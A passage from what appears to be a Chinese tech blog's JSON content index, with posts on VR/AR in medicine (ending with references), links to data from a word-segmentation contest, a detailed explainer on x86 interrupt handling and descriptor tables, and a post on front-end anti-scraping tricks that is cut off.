在我们国家，新一轮的医疗体制改革如火如荼，传统的医疗体系已经岌岌可危，惟有引入新的信息技术才能适应时代要求。而且，新的医疗体制改革凸现了“社区医疗”的概念。“社区医疗”在全球医疗信息化中对应其第三个阶段，区域医疗信息网络（GMIS），是继医院管理系统（HMIS）、临床医疗信息系统（CIS）之后的阶段。美国所有医疗机构均实现了信息化管理，而中国尚处在初级阶段。将来中国的趋势必然是走向医疗信息化（e-Health）。为了实现这一战略目标，虚拟现实技术就是最佳的操作工具。因此，虚拟现实技术将在中国的“医改”过程中以及今后医疗事业的发展中扮演更加积极、重要的角色。 医疗VR是一个给人无限遐想的领域，它不再只存在于科幻小说爱好者的想象中，而是已经走进了临床研究者和现实生活中的医疗工作者的视野。虽然这是一个全新的领域，还不为大众所知，但是医疗VR技术是对患者的生活和医生的工作都可以产生积极影响的应用。我相信VR必将为医学领域带来一场大变革。 结论 VR/AR作为目前比较新潮的技术，在医学领域作用空前。其在医疗上无论从医生角度、患者角度还是医学教育角度都有着十分巨大的作用。现在相关的科学研究也发展迅速，当然也是存在很多的不足，尤其是我们国家在这方面的研究还很欠缺。在今后的一段时间内，我国的VR开发者还是应该多学习和借鉴国外的先进经验，同时保持在这方面的热情，相信在不久的将来，VR/AR定会在医学领域大大地大放异彩。 参考文献 刘建武, 叶志前, 陆金芳. 虚拟现实在医学中的应用进展[J]. 国际生物医学工程杂志, 2000(6):321-324. 王海舜, 潘利庆. 虚拟现实技术在医学中的应用[J]. 计算机应用, 1998, 22(6):49-54. 刘聚卑, 庄天戈. 虚拟现实在医学上的应用[J]. 北京生物医学工程, 2000, 19(1):47-54. 谭珂, 郭光友, 王勇军,等. 虚拟现实技术在医学手术仿真训练中的应用[J]. 解放军医学院学报, 2002, 23(1):77-79. 范立冬, 李曙光, 张治刚. 虚拟现实技术在医学训练中的应用[J]. 创伤外科杂志, 2008, 10(6):568-570. 谭海珠, 杨棉华, 陈丹芸,等. 虚拟现实技术在医学中的发展与应用[J]. 中华医学教育探索杂志, 2005, 4(6):410-412. 张晗 虚拟现实技术在医学教育中的应用探讨[J]. 西北医学教育, 2010, 18(1):48-51. 孙秀伟, 阎丽, 李彦锋. 虚拟现实技术(VR)在医疗中的应用展望[J]. 临床医学工程, 2007(5):17-20. 吴奇, 程薇曦. 虚拟现实技术在医学手术中的实现与应用[J]. 重庆医学, 2008, 37(21):2489-2491. 李舫, 宋志坚. HMD式光学穿透技术在医学增强现实中的研究进展[J]. 中国数字医学, 2012, 07(1):14-20. 孙国臣, 余新光, 陈晓雷,等. 基于多模态功能神经导航的虚拟现实及增强现实技术在神经外科教学中的应用[J]. 中国医学教育技术, 2015(1):66-69. 李潜. 增强现实技术为医学教育开拓无限未来[J]. 电脑知识与技术, 2012, 08(2):481-482. 张军毅. 医学增强现实建模及可视化研究[D]. 首都医科大学, 2008. 赵娜, 杨谊平. 增强现实技术与手术模拟[J]. 中华医学丛刊, 2004(4):58-59. Wang S, Parsons M, Stonemclean J, et al. Augmented Reality as a Telemedicine Platform for Remote Procedural Training.[J]. Sensors, 2017, 17(10):2294. Noll C, Jan U V, Raap U, et al. Mobile Augmented Reality as a Feature for Self-Oriented, Blended Learning in Medicine: Randomized Controlled Trial[J]. Jmir Mhealth &amp; Uhealth, 2017, 5(9):e139. Mero M, Susin A, Aplicada D M. Deformable 3D Objects for a VR medical application[J]. 2007. Crossan A, Brewster S, Reid S, et al. Multi-session VR Medical Training: The HOPS Simulator[J]. People and Computers XVI - Memorable Yet Invisible, 2002:213–226. Bezerra A. Evaluation of VR medical training applications under the focus of professionals of the health area[C]// ACM Symposium on Applied Computing. ACM, 2009:821-825. JLM Vazquez, BK Wiederhold, I Miller, et al. Virtual Reality Assisted Anesthesia (VRAA) during Upper Gastrointestinal Endoscopy: Report of 115 Cases— Analysis of Physiological Responses, 2017 本文链接： http://www.meng.uno/articles/c1dd0093/ 欢迎转载！","categories":[{"name":"人机交互","slug":"人机交互","permalink":"http://www.meng.uno/categories/人机交互/"},{"name":"AR","slug":"人机交互/AR","permalink":"http://www.meng.uno/categories/人机交互/AR/"},{"name":"VR","slug":"人机交互/AR/VR","permalink":"http://www.meng.uno/categories/人机交互/AR/VR/"}],"tags":[{"name":"VR","slug":"VR","permalink":"http://www.meng.uno/tags/VR/"},{"name":"AR","slug":"AR","permalink":"http://www.meng.uno/tags/AR/"},{"name":"医疗","slug":"医疗","permalink":"http://www.meng.uno/tags/医疗/"}]},{"title":"中文分词小赛数据","slug":"nlpc","date":"2017-10-30T08:02:41.000Z","updated":"2018-03-01T13:29:17.789Z","comments":true,"path":"articles/649482ba/","link":"","permalink":"http://www.meng.uno/articles/649482ba/","excerpt":"纪念一下大四组织的一次中文分词小比赛。 分项数据 * 训练数据： 链接: https://pan.baidu.com/s/1sl9JLqX 密码: 8am6 * 测试数据： 链接: https://pan.baidu.com/s/1eSeYhfO 密码: cnw2 * 相关参考答案： 链接: https://pan.baidu.com/s/1c2tVto0 密码: 3rpt * 有切分歧义的100个句子：链接: https://pan.baidu.com/s/1gfJ7Duz 密码: 8mmx 所有数据 所有文件下载：链接: https://pan.baidu.com/s/1smU","text":"纪念一下大四组织的一次中文分词小比赛。 分项数据 训练数据： 链接: https://pan.baidu.com/s/1sl9JLqX 密码: 8am6 测试数据： 链接: https://pan.baidu.com/s/1eSeYhfO 密码: cnw2 相关参考答案： 链接: https://pan.baidu.com/s/1c2tVto0 密码: 3rpt 有切分歧义的100个句子：链接: https://pan.baidu.com/s/1gfJ7Duz 密码: 8mmx 所有数据 所有文件下载：链接: https://pan.baidu.com/s/1smU54gl 密码: x5ne 测试结果 相关PPT：PPT下载 本文链接： http://www.meng.uno/articles/649482ba/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"NLP","slug":"AI/NLP","permalink":"http://www.meng.uno/categories/AI/NLP/"}],"tags":[{"name":"NLP","slug":"NLP","permalink":"http://www.meng.uno/tags/NLP/"}]},{"title":"中断","slug":"interrupt","date":"2017-08-06T14:38:33.000Z","updated":"2018-04-10T05:46:42.628Z","comments":true,"path":"articles/81b224e1/","link":"","permalink":"http://www.meng.uno/articles/81b224e1/","excerpt":"什么是中断？ 中断是能够打断CPU指令序列的事件，它是在CPU内外，由硬件产生的电信号。CPU接收到中断后，就会向OS反映这个信号，从而由OS就会对新到来的数据进行处理。不同的事件，其对应的中断不同，而OS则是通过中断号(也即IRQ线)来找到对应的处理方法。不同体系中，中断可能是固定好的，也可能是动态分配的。 中断产生后，首先会告诉中断控制器。中断控制器负责收集所有中断源的中断，它能够控制中断源的优先级、中断的类型，指定中断发给哪一个CPU处理。 中断控制器通知CPU后，对于一个中断，会有一个CPU来响应这个中断请求。CPU会暂停正在执行的程序，转而去执行相应的处理程序，也即OS当中的中断","text":"什么是中断？ 中断是能够打断CPU指令序列的事件，它是在CPU内外，由硬件产生的电信号。CPU接收到中断后，就会向OS反映这个信号，从而由OS就会对新到来的数据进行处理。不同的事件，其对应的中断不同，而OS则是通过中断号(也即IRQ线)来找到对应的处理方法。不同体系中，中断可能是固定好的，也可能是动态分配的。 中断产生后，首先会告诉中断控制器。中断控制器负责收集所有中断源的中断，它能够控制中断源的优先级、中断的类型，指定中断发给哪一个CPU处理。 中断控制器通知CPU后，对于一个中断，会有一个CPU来响应这个中断请求。CPU会暂停正在执行的程序，转而去执行相应的处理程序，也即OS当中的中断处理程序。这里，中断处理程序是和特定的中断相关联的。 中断描述符表 那么CPU是如何找到中断服务程序的呢？为了让CPU由中断号去查找到对应的中断程序入口，就需要在内存中建立一张查询表，也即中断描述符(IDT)。在CPU当中，有专门的寄存器IDTR来保存IDT在内存中的位置。这里需要注意的是，常说的中断向量表，是在实模式下的，中断向量是直接指出处理过程的入口，而中断描述符表除了入口地址还有别的信息。 IDTR有48位，前32位保存了IDT在内存中的线性地址，后16位则是保存IDT的大小。而IDT自身，则是一个最大为256项的表（对应了8位的中断码），表中的每个向量，是一个入口。这里IDT表项的异常类型可以分为三种，其表项的格式也不同： 任务门：利用新的任务方式去处理，需要切换TSS。它包含有一个进程的TSS段选择符，其偏移量部分没有用，linux没有采用它来进行任务切换。 中断门：适宜处理中断，在进入中断处理时，处理器会清IF标志，避免嵌套中断发生。中断门中的DPL(Descriptor privilege Level)为0，因此用户态不能访问中断门，中断处理程序都是用中断门来激活的，并且限制在内核态。 陷阱门：适宜处理异常，和中断门类似，但它不会屏蔽中断。 以下是32bit中的IDT表项。 值得注意的是，CPU还提供一种门，调用门，它是linux内核特别设置的，通常通过CALL和JMP指令来使用，能够转移特权级。 实模式和保护模式 在了解CPU是如何通过中断向量表调用具体的服务程序之前，首先需要了解CPU的工作方式。 对于IA-32架构，它支持实模式、保护模式和系统管理模式。 实模式以拓展对方式实现了8086CPU的程序运行环境，处理器在刚刚上电和重启后时，处于实模式，其寻址空间最大为1M(2^20)。实模式的主要意义，在于提供更好的兼容性，开发者能够直接使用BIOS中断，从而在boot阶段不必关注硬件的具体实现。实模式主要还是为进入保护模式进行准备。 8086处理器有16-bit寄存器和16-bit的外部数据总线，但能够访问20-bit的地址，因为它引入了“分段机制”，一个16bit的段寄存器包含了一个64KB的段的基址。而段寄存器＋16bit的指针，就能够提供20bits的地址空间。其计算方式为：16位基地址左移4位＋16位偏移量＝20位。 保护模式是处理器的根本模式。保护模式可以直接为实模式程序提供保护的，多任务的环境，这种特性被称为虚拟8086模式，它实际上是保护模式的一种属性。保护模式能够为任何任务提供这种属性。在保护模式中，地址依然通过“段＋偏移量”的形式来实现，但此时段寄存器中保存的不再是一个段的基址，而是一个索引。通过这个索引可以找到一个表项，里面存放了段基址等许多属性，这个表项也就是段描述符，而这个表也就是GDT表。 保护模式的最大寻址是2^32次方，也即4G，并且可以通过PAE模式访问超过4G的部分。它有4个安全级别，内存操作时，有安全检查。其分页功能带来了虚拟地址和物理地址的区别。 系统管理模式为操作系统或者执行程序提供透明的机制去实现平台相关的特性，例如电源管理、系统安全。 对于Intel 64架构，它增加了两种子模式。 兼容模式允许绝大部分16bit-32bit应用无需编译就能在64bit下运行，它类似于保护模式，有4G的地址空间限制。 64bit模式在64bit线性地址空间上运行应用程序，通用寄存器被增加到64bits。它取消了分段机制，其默认地址长度为64bits。 x64寻址 在保护模式下(32bit)，物理地址的翻译分为两步：逻辑地址翻译(段)和线性地址翻译(页)。逻辑地址利用16bit segment selector和32bit offset来表示。处理器首先要将逻辑地址翻译为线性地址(32bit)。这个翻译过程如下： 通过segment selector，在对应的GDT或LDT中去找到段描述符； 检查段描述符，访问是否合法，段是否能够访问，偏移量是否在范围之内； 将段基地址和偏移量相加来获取线性地址的值。 在IA-32e模式下(64bit)，逻辑地址的翻译步骤和上述过程类似，唯一不同的是，其段基地址和偏移量，都是64bit，而不是32bit的。线性地址同理也是32bit的。 段寻址，也即将内存分成不同的段，利用段寄存器能够找到其对应的段描述符，从而获得相关的段基址、大小、权限等信息。 段选择子Segment selector的示意图如下： 段选择子会被存在段寄存器当中，其中最低两位为RPL(cs寄存器不同，最低位位CPL)。而第三位Table Indicator则是表示该从GDT还是LDT寻找对应的段描述符，后面的bits就是对应的index了。 为了减少地址翻译的开销，处理器提供了6个段寄存器，CS，SS，DS，ES，FS，GS。通常来说一个程序至少有CS、DS、SS三个selector。假设程序要使用段来访问地址，那么必须将segment selector载入段寄存器当中。对此，Intel是提供了特殊的指令的，直接载入的指令包括MOV，POP，LDS，LES等。而隐含的载入则包括CALL，JMP，RET，SYSENTER等等。它们会改变CS寄存器(有时也会改变其它段寄存器)的内容。 而在IA-32e模式下(64bit mode)，ES，DS，SS段寄存器都不会使用了，因此它们的域会被忽视掉，而且某些load指令也被视为违法的，例如LDS。与ES，DS，SS段有关的地址计算，会被视为segment base为0。为了保证兼容性，在64bit mode当中，段load指令会正常执行，从GDT、LDT中读取时，也会读取寄存器的隐藏部分，并且值都会正常的载入。但是data、stack的segment selector和描述符都会被忽略掉。 而FS和GS段在64bit mode能够手动使用，它们的计算方式为(FS/GS).base+index+displacement。用这种方式去进行内存访问时，是不会进行检查的。载入的时候不会载入Visible Part，也即Segment Selector，也就是把段机制给忽略了。 IDT，LDT和GDT 中断向量表提供了一个入口，但这个入口还需要进一步的计算。这个入口的计算，是通过段寻址来实现的。而段的信息，则是保存在LDT和GDT当中。 段描述符的结构如下图： 段描述符最重要的部分是DPL位，它会在权限检查的时候使用。在进程需要装载一个新的段选择子时，会判断当前的CPL和RPL是否都比相应的DPL权限高，如果是则允许加载新的段选择子，否则产生GP。 在操作系统中，全局描述符只有一张，也即一个CPU对应一个GDT。GDT可以存放在内存中的任何地址，但CPU必须知道GDT的入口，因此有一个寄存器GDTR用来存放GDT的入口地址，它存放了GDT在内存中的基址和表长。 但是在64位系统当中，段机制就被取代了，而页表项也能够达到数据访问的保护目的。但是对于不同特权级之间的控制流转移，还是和原来的机制一样。在64-bit模式中，GDT依然存在，但不会改变，而其寄存器被拓展到了80bit。 而GDT中会包含一个LDT段的段描述符，LDT是通过它的段描述符来访问的。 在IA-32e模式下，段描述符表可以包含2^13个8-byte描述符。这里，描述符分为两种，段描述符会占据一个entry(8bit)，而系统描述符会占据两个entry(16bit)。而GDTR和LDTR被拓展为能够保存64bit的基地址。其中，IDT描述符、LDT、TSS描述符和调用门描述符都被拓展称为了16bytes。 64bit IDT描述符的格式如下 64bit LDT描述符的格式如下 中断的处理过程 在intel 手册上看到的大图，很详细的解释了IA-32模式和IA-32e模式下的系统架构，它也就包含了中断处理和线性地址的翻译过程。 在中断产生之后，处理器会将中断向量号作为索引，在IDT表中找到对应的处理程序。IDT表将每个中断/异常向量和一个门描述符关联起来。在保护模式下，它是一个8-byte的描述符（与GDT，LDT类似），IDT最大有256项。IDT能够保存在内存中的任何位置，处理器用IDTR寄存器来保存它的值。 在中断/陷阱门描述符中，segment selector指向了GDT或当前LDT中的代码段描述符，而offser域指向了exception/interrupt的处理过程。 在执行call这一步的时候，倘若handler过程会在一个更低的权限执行，那么就会涉及到stack switch。当stack switch发生时，segment selector和新的栈指针都需要通过TSS来获取，在这个栈上，处理器会把之前的segment selector和栈指针压入栈中。处理器还将保存当前的状态寄存器在新的栈上。 如果handler过程会在相同的权限执行，处理器会把状态寄存器的值保存在当前的栈上。 从中断处理程序返回时，handler必须使用IRET指令。它与RET类似，但它会将保存的标志位恢复到EFLAGS寄存器中。如果stack switch在调用过程中发生了那么IRET会切换到中断前的stack上。在中断过程中，权限级的保护与CALL调用过程类似，会对CPL进行检查。 64-bit模式下的中断处理 在64bit模式下，中断和异常的处理与非64bit模式下几本一致，但也存在一些不同的地方。包括有： IDT所指向的代码是64bit代码 中断栈push的大小是64bit 栈指针(SS:RSP)在中断时，无条件的被push（保护模式下是由CPL来决定的） 当CPL有变化时，新的SS会被设置为NULL IRET的过程不同 stack-switch的机制不同 中断stack的对齐不同 其中，64bit的IDT门描述符在前面已经介绍了。IST（interrupt Stack Table）用于stack-switch。通过中断门来调用目标代码段时，它必须为一个64bit的代码段(CS.L=1,CS.D=0)。如果不是也会触发#GP。在IA-32e模式下，只有64bit的中断和陷阱门能够被调用，遗留的32bit中断/陷阱都被重新定义为64bit的。 在遗留模式中，IDT entry的大小是16/32bit，它决定了interrupt-stack-frame push时的大小。并且SS:ESP只在CPL发生改变时被压入stack中。在64bit模式下，interrupt-stack-frame push的大小被固定为8bytes(因为只有64bit模式的门能够被调用)，而且SS:RSP是无条件压入栈中的。遗留模式下，Stack pointer能够在任何地址进行push，但是IA-32e模式之下，RSP必须是16-byte边界对齐的，而stack frame在中断处理程序被调用时也会对齐。而在中断服务结束时，IRET也会无条件的POP出SS:RSP，即使CPL=0。 IA-32e模式下，stack-switching机制被替代了，它被称为interrupt stack table(IST)。 遗留模式下，在64bit中，中断如果造成了权限级的改变，那么stack就会switch，但是这时不会载入新的SS描述符，而只会从TSS中载入一个inner-level的RSP。新的SS selector被强制设置为NULL，这样就能够处理内嵌的far transfers。而旧的SS和RSP会被保存在新的栈上。也就是说stack-switch机制除了SS selector不会从TSS加载之外，其余都一样。 而新的IST模式，则是无条件的进行stack switch。它是基于IDT表项中的一块区域实现的，它的设计目的，是为特殊的中断(NMI、double-fault、machine-check)等提供方法。在IA-32e模式下，一部分中断向量能够使用IST，另一部分能够使用遗留的方法。 IST在TSS中，提供7个IST指针，在中断门的描述符当中，由一个3bit的IST索引位，它们用来找到TSS中IST的偏移量。通过这个机制，处理器将IST所指向的值加载到RSP当中。而当中断发生时，新的SS selector被设置为NULL，并且SS selector的RPL区域被设置为新的CPL。旧的SS、RSP、RFLAGS、CS和RIP被push入新的栈中。如果IST的索引为0，那么就会使用修改后的、旧的stack-switch机制。 保护机制 Intel 64/IA-32架构提供了段/页级别的保护机制，它们利用权限级，来限制对于的段/页的访问，例如重要的OS代码和数据能够被放在更高权限级的段中，操作系统会保护它们不被应用程序访问。当保护机制启用时，每次内存访问都会被检查，这些检查包括： Limit Tyep Privilege level Restriction of Procedure entry-points Restriction of instruction set 通过CR0寄存器当中的PE flag能够开启保护模式，打开段保护机制；而页保护机制则是在分页机制启用时，自动开启的。虽然64bit中，不再使用分段机制了，但代码段依然存在。对于地址计算来说，其段地址被视为0，CS描述符当中的内容被忽略，但其余部分保持一致。代码段描述符、selector依然存在，它们在处理器的操作模式、执行权限级上依然发挥作用。其工作方式如下： CS描述符中会使用一个保留位，Bit 53被定义为64 bit flag位(L)，并且被用来在64bit/兼容模式之间切换。当CS.L ＝ 0时，CPU处于兼容模式，CS.D则决定了数据和地址的位数为16/32bit。如果CS.L为1，那么只有CS.D = 1是合法的，并且地址和数据的位数是64bit。在IA-32e模式下，CS描述符当中的DPL位被用来做执行权限的检查(与32bit模式一样)。 Limit Checking 在段描述符当中，有一个limit field，它防止程序访问某个段之外的的内存位置，其有效值由G flag来决定，对于数据段来说，其limit还由E flag和B flag决定。在64bit模式下，处理器不会对代码段活着数据段进行limit check，但是会对描述符表的limit进行检查。 Type checking 段描述符包含两个type 信息，S flag和type field。处理器会使用这个信息，来检查对段和门的不正确使用。S flag表示descriptor的类型，它包括系统/代码/数据三种类型。在处理一个段选择子时，处理器会在： 将segment selector载入段寄存器：寄存器只能包含对应的描述符类型 指令访问段时：段只能被相应的指令访问 指令包含segment selector时：指令只能对某些特定类型的段/门进行访问 进行某些具体操作时：far call、far jump，对调用门、任务门的call/jump等，会判断描述符中的类型是否符合要求。 Privilege levels 处理器的段保护机制包含有4个privilege levels，从0到3，0最高，3最低。处理器利用这种机制，来防止一个低权限的进程，访问更高权限的部分。为了实现这个目的，处理器使用3种类型的权限级： CPL：当前执行任务的权限级。它保存在CS和SS段寄存器的bit 0-1中。通常，CPL和当前代码段的权限一致，当跳转到一个有不同权限的代码段时，CPL会发生变化。如果目标是一致代码段，则会延续当前的CPL。 DPL：segment或者gate的权限级。它保存在段或者门的描述符当中，当当前的代码段执行，需要访问一个段或者gate的时候，这个段/门的DPL就会被拿来与CPL和RPL进行比较。在不同的环境下，DPL的意义也是不同的。 RPL：与segment selector有关的，能够对权限进行覆盖的权限级。它保存在segment selector的bit 0-1中。处理器会通过CPL和RPL来判断对segment的访问是否合法。即使请求访问某个段的程序，拥有比段更高的权限，如果RPL不是有效的，访问还是会被拒绝。也就是说如果RPL把CPL高，那么RPL会覆盖CPL。RPL能够保证提权的代码，不能随意访问一个segment段，除非它自身有这个权限。直观的说，必须CPL和RPL都比DPL要高，只有这种情况下，才会允许这个段的访问。其主要目的，是允许高权限为低权限提供服务的时候，能够通过较低的权限来加载段。 门调用符与权限检查： TSS 处理器执行工作的单位，被称为task。一个task分为两个部分，task的执行空间和task-state segment(TSS)。前者指的是code/stack/data segment，而后者则定义了组成前者的各个段。task是由TSS的segment selector来识别的。当一个任务被加载到处理器中执行时，segment selector、基址、limit、TSS的段描述符等都会被加载到**task register(TR)**当中去。分页启动时，页目录的基址还会载入到控制寄存器CR3当中去。 一个任务的状态，由一系列的寄存器和TSS来定义。这里，处理器定义了5个数据结构，来处理任务相关的活动。 TSS Task-gate描述符 TSS描述符 Task寄存器 EFLAGS寄存器中的NT flag 为了恢复一个task，处理器所需要的信息，保存在一个系统段中，它被称为TSS。在64bit模式下，它的格式如下： 而TSS描述符，则和其他的段一样，是由一个段描述符来定义的，它的结构在上文中已经给出了（与LDT是一致的），它只能放在GDT当中，不能放在LDT或者IDT当中。 Task寄存器保存了当前TSS的段选择子和整个段描述符。它包含可见和不可见两个部分（能否被软件修改）。段选择子位于可见部分，指向GDT当中的TSS描述符。不可见部分则是用来保存TSS的段描述符（能够提高执行效率）。 中断的发生 中断指的是CPU在运行时，系统内发生了需要“急需处理”的事件，于是乎CPU暂停了当前正在执行对程序，转而去执行相应的时间处理程序，在处理完之后返回原来的地方执行。那么这些事件包含：（1）外部中断指的是那些CPU外的周边原件引发的中断，例如I/O中断，I/O设备异常（接下来我们把它称为“中断”）；（2）内部中断指的是在CPU内部执行时，由程序自身、异常、陷阱（例如程序中的断点）产生的中断（包括硬件中断和软件中断，其中软件中断是指一系列的指令）（接下来我们把它称作“异常”）。 这两种中断类型不同，产生方式也不一样： （1）中断因为是由外设硬件发出的，所以需要由中断控制器（APIC）参与其中。在中断发出后，首先由APIC来进行处理。这种方式解决两个问题：（a）有大量的外设，而CPU的引脚资源有限，所以不能满足所有的直连需要；（b）如果设备中断和CPU直连，那么在MP系统中，中断负载等需求就无法实现了。 可以看到，在x86_64系统下，local APIC通过I/O APIC接受链接，I/O APIC把中断处理成中断消息，并按照规则转发给local APIC。APIC决定了由哪个CPU来处理中断，为某个引脚产生特定的中断向量（中断投递协议），并把中断请求发送给对应的CPU处理。CPU之间的中断通信，也是通过APIC来完成的。 I/O设备通过IRQ线与APIC相连，APIC将信号转化为对应的向量，并把这个向量放在它的I/O端口上，允许CPU通过数据总线来读这个向量；随后它发送一个信息给CPU的INTR引脚，从而触发中断，当CPU通过把中断信号写进APIC的I/O端口时，把INTR线清除。目前，外部中断的编号是从32开始，这是由于0-31号中断是留给异常和内部中断使用的，INTEL手册上也给出了这样一个表，详细说明了中断号的对应关系（新的CPU确实用的编号也变多了，就比如#VE）： （2）异常则是由CPU自身产生的中断。那么这种中断是否需要APIC介入呢？除了I/O APIC的中断信号外，local APIC还会接收其他来源的中断，例如CPU LINT0/LINT1中断（本地连接的I/O），性能计数器中断、APIC内部错误中断等。但这不意味着所有异常都需要中断控制器的参与；软件中断的中断号是可以由指令直接给出的，因此是不需要中断控制器的参与的。 中断的屏蔽 注意，这里的中断屏蔽指的是对外部中断的屏蔽（mask）。CPU内部的中断（异常）是不能屏蔽的。在内核同步中，通常采用这种方式来屏蔽外部的中断；并结合自旋锁来保证中断不被打断。 IRQ和NMI分别是可屏蔽和不可屏蔽中断（例子：打印机中断和电源掉电）。CPU在处理NMI中断时，不从外部硬件接收中断向量号，其对应中断向量号固定为2。NMI中断通常用于故障处理（协处理器运算出错、存储器校验出错等危急事件）。NMI处理程序通常应以IRET指令来结束。IRQ则是可以屏蔽的一类中断，通过设置CPU中的IF位，可以对IRQ进行屏蔽，这个标志位可以通过软件来设置。例如在处理某个高优先级中断时，CPU收到了低优先级的中断，那么就会对它进行屏蔽。 而对于内核的同步，则是由操作系统内部来实现的。可以说，目前我们讨论的只是中断是如何被送到CPU的，而CPU把中断和异常送给操作系统，并操作系统做出反应的过程，则属于另一个范畴了（在另一片博文http://sec-lbx.tk/2017/02/15/中断相关）。 异常和中断的处理 我们可以把内核，理解成一个服务器，它不断处理着用户的各种请求。因此，它需要保证每项服务在处理时，不会互相造成影响；其并发的来源包括内核的抢占和中断处理等。在内核态，中断处理程序也可以嵌套，这种情况下中断处理程序必须永不阻塞，在它运行的期间不能发生进程切换（不过缺页异常是一个例外，它不会引起进一步的异常，所以缺页异常可以切换进程，提高效率）。中断处理程序既可以抢占其他的中断处理程序，也可以抢占异常处理程序。相反的，异常处理程序从不会抢占中断处理程序。如果已经在内核态了，就只可能发生缺页异常（当然，也包含有现在的EPT缺页），但它们不会进一步的进行导致缺页的操作。 异常处理程序通常包含三个部分：（1）在内核堆栈保存大多数寄存器的内容；（2）用高级的C函数对异常进行处理；（3）通过 ret_from_exception()函数，从异常处理程序退出。 中断处理程序与异常处理程序不同，因为当下运行的进程可能和中断完全无关。中断可以分为：I/O中断、时钟中断、处理器间中断。这里，以I/O中断为例。I/O中断必须能够为多个设备同时提供服务，而多个设备却可能会共享一个IRQ线。它往往包含四个部分：（1）在内核态堆栈中保存IRQ的值和寄存器的内容；（2）给为IRQ服务的PIC发一个应答，允许PIC进一步发出中断；（3）执行共享这个IRQ的所有设备的中断服务历程（do_IRQ()会执行与一个中断相关的所有中断服务历程，并且验证它的设备是否需要关注，这也与驱动注册相关）；（4）跳转到ret_from_inrt()后终止。 IRQ的动态分配：IRQ线可能在最后时刻才和一个设备驱动相关联，这样即使几个硬件设备不共享IRQ，也能够让几个设备在不同时刻使用同一个IRQ向量。 处理器间的中断（IPI） 由某个CPU向系统中的其他CPU发送中断信号，它不由IRQ总线，而是由本地APIC的总线传递。Linux定义了这样几种处理器间中断。 CALL_FUNCTION：强制所有剩余CPU执行发送者传递过来的函数 RESCHEDULE_VECTOR：让被中断的CPU重新调度 INVALIDATE_TLB_VECTOR：强制CPU清洗TLB 软中断和tasklet 软中断是一种提高运行效率的手段，其核心思想是把不紧迫懂、可以延时处理的中断部分，在中断上下文外，由操作系统自行安排运行时机来运行。tasklet则是建立在软中断之上来实现的，它是I/O驱动中实现可延迟函数的主要方法。对于挂起的软中断，内核会用ksoftirqd进行检查和运行。 工作队列 工作队列是内核中，另外一种将工作推后的形式。其特点在于，它允许重新调度和睡眠。其本质就是将工作交给内核线程处理。如果推后执行的任务需要睡眠、或者延时指定的时间再触发，则使用这种形式比较好；倘若推后的任务需要在一个tick内处理，那么还是选择软中断或者tasklet的形式比较好。 本文链接： http://www.meng.uno/articles/81b224e1/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"系统安全","slug":"系统安全","permalink":"http://www.meng.uno/tags/系统安全/"},{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/tags/操作系统/"}]},{"title":"前端如何反击爬虫","slug":"prevent-spiders","date":"2017-07-09T02:36:00.000Z","updated":"2018-03-20T06:59:57.927Z","comments":true,"path":"articles/c50121e6/","link":"","permalink":"http://www.meng.uno/articles/c50121e6/","excerpt":"前言 对于一张网页，我们往往希望它是结构良好，内容清晰的，这样搜索引擎才能准确地认知它。 而反过来，又有一些情景，我们不希望内容能被轻易获取，比方说电商网站的交易额，教育网站的题目等。因为这些内容，往往是一个产品的生命线，必须做到有效地保护。这就是 爬虫与反爬虫这一话题的由来。 常见反爬虫策略 但是世界上没有一个网站，能做到完美地反爬虫。 如果页面希望能在用户面前正常展示，同时又不给爬虫机会，就必须要做到识别真人与机器人。因此工程师们做了各种尝试，这些策略大多采用于后端，也是目前比较常规单有效的手段，比如： * User-Agent + Referer检测 * 账号及Cookie验证","text":"前言 对于一张网页，我们往往希望它是结构良好，内容清晰的，这样搜索引擎才能准确地认知它。 而反过来，又有一些情景，我们不希望内容能被轻易获取，比方说电商网站的交易额，教育网站的题目等。因为这些内容，往往是一个产品的生命线，必须做到有效地保护。这就是 爬虫与反爬虫这一话题的由来。 常见反爬虫策略 但是世界上没有一个网站，能做到完美地反爬虫。 如果页面希望能在用户面前正常展示，同时又不给爬虫机会，就必须要做到识别真人与机器人。因此工程师们做了各种尝试，这些策略大多采用于后端，也是目前比较常规单有效的手段，比如： User-Agent + Referer检测 账号及Cookie验证 验证码 IP限制频次 而爬虫是可以无限逼近于真人的，比如： chrome headless或phantomjs来模拟浏览器环境 tesseract识别验证码 代理IP淘宝就能买到 所以我们说，100%的反爬虫策略？不存在的。 更多的是体力活，是个难易程度的问题。 不过作为前端工程师，我们可以增加一下游戏难度，设计出一些**很(sang)有(xin)意(bing)思(kuang)**的反爬虫策略。 前端与反爬虫 font-face拼凑式 例子：猫眼电影 猫眼电影里，对于票房数据，展示的并不是纯粹的数字。 页面使用了font-face定义了字符集，并通过unicode去映射展示。也就是说，除去图像识别，必须同时爬取字符集，才能识别出数字。 并且，每次刷新页面，字符集的url都是有变化的，无疑更大难度地增加了爬取成本。 background拼凑式 例子：美团 与font的策略类似，美团里用到的是background拼凑。数字其实是图片，根据不同的background偏移，显示出不同的字符。 并且不同页面，图片的字符排序也是有区别的。不过理论上只需生成0-9与小数点，为何有重复字符就不是很懂。 页面A： 页面B： 字符穿插式 例子：微信公众号文章 某些微信公众号的文章里，穿插了各种迷之字符，并且通过样式把这些字符隐藏掉。 这种方式虽然令人震惊…但其实没有太大的识别与过滤难度，甚至可以做得更好，不过也算是一种脑洞吧。 对了，我的手机流量可以找谁报销吗？ 伪元素隐藏式 例子：汽车之家 汽车之家里，把关键的厂商信息，做到了伪元素的content里。 这也是一种思路：爬取网页，必须得解析css，需要拿到伪元素的content，这就提升了爬虫的难度。 元素定位覆盖式 例子：去哪儿 还有热爱数学的去哪儿，对于一个4位数字的机票价格，先用四个i标签渲染，再用两个b标签去绝对定位偏移量，覆盖故意展示错误的i标签，最后在视觉上形成正确的价格… 这说明爬虫会解析css还不行，还得会做数学题。 iframe异步加载式 例子：网易云音乐 网易云音乐页面一打开，html源码里几乎只有一个iframe，并且它的src是空白的：about:blank。接着js开始运行，把整个页面的框架异步塞到了iframe里面… 不过这个方式带来的难度并不大，只是在异步与iframe处理上绕了个弯（或者有其他原因，不完全是基于反爬虫考虑），无论你是用selenium还是phantom，都有API可以拿到iframe里面的content信息。 字符分割式 